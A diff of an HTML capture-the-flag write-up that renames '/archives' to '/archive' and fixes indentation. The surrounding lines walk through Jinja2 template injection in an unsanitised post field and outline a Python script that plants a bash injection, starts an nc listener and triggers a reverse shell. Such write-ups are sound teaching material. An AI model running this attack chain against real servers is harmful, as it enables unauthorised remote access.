@@ -41,18 +41,18 @@ body {
 	After creating a new account and logging in, there is a page to create a new post/comment.			 	<br/> <br/>
 	<img src="images/doctor/inject1-post.PNG" alt="nmap" class="inline"/>         						<br/> <br/> <br/>
 		  
-	In the page source there is a hidden link to the /archives page, which appears to display our posts/comments.				<br/> <br/>
+	In the page source there is a hidden link to the /archive page, which appears to display our posts/comments.				<br/> <br/>
 	<img src="images/doctor/archive.PNG" alt="nmap" class="inline"/> 									<br/> <br/> <br/>
 		  
-	The posts are not being sanitized whatsoever, and we can directly inject html in the /archives page. 					<br/> <br/>
+	The posts are not being sanitized whatsoever, and we can directly inject html in the /archive page. 					<br/> <br/>
 	<img src="images/doctor/inject1.PNG" alt="nmap" class="inline"/>         								<br/> <br/> <br/>	  
 	
 	The challenge now becomes how can we inject html such that when	it gets executed we receive a reverse shell.				<br/> <br/>
 	I found an awesome <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2"> html injection resource here </a> <br/><br/>
 	<img src="images/doctor/jinja2-basic.PNG" alt="web page" class="inline"/>         							<br/> <br/> <br/>
 		  
-	Initially I tried the basic jinja2 injection. I tried to see if we could get the server to execute {4*4*4} so that when we query /archives, the number 				<br/> 
-	64 is presented. We can see on the archives page source that our code is inside of both a title and item bracket, so our injection will start out closing those first.		<br/> <br/><br/>
+	Initially I tried the basic jinja2 injection. I tried to see if we could get the server to execute {4*4*4} so that when we query /archive, the number 				<br/> 
+	64 is presented. We can see on the archive page source that our code is inside of both a title and item bracket, so our injection will start out closing those first.		<br/> <br/><br/>
 
 	After injecting 												<br/><br/>
 	<code>
@@ -64,7 +64,7 @@ body {
 		&lt;title&gt;&lt;item&gt; &lt;/title&gt;&lt;/item&gt; 64&lt;/title&gt;&lt;/item&gt;
 	</code>														<br/> <br/><br/>
 
-	We can see the expected output, 64, on the archives page							<br/> <br/>
+	We can see the expected output, 64, on the archive page							<br/> <br/>
 	<img src="images/doctor/inject2.PNG" alt="basic injection" class="inline"/>         				<br/> <br/> <br/>
 
 	As well as the expected source code after closing our tags							<br/> <br/>
@@ -92,11 +92,11 @@ body {
 	I then started on the python script								</br>							
 	<pre>
 	The script will:
-		  #1 - generate a random string and register a new account under that string
-		  #2 - login to that account
-		  #3 - create a post with our bash injection 
-		  #4 - startup a nc listener
-		  #5 - visit /archives to trigger our reverse shell
+	   #1 - generate a random string and register a new account under that string
+   	   #2 - login to that account
+	   #3 - create a post with our bash injection 
+	   #4 - startup a nc listener
+	   #5 - visit /archive to trigger our reverse shell
 	</pre> <br/> <br/><br/> <br/>
 		
 		
@@ -171,7 +171,7 @@ body {
     		# Startup listener and trigger our injected code
     		l = listen(my_port)
     		time.sleep(2)
-    		print("[+] Querying /archives to trigger shell")
+    		print("[+] Querying /archive to trigger shell")
     		try:
         		archive = session.get(archive_url, timeout=0.5)
     		except:
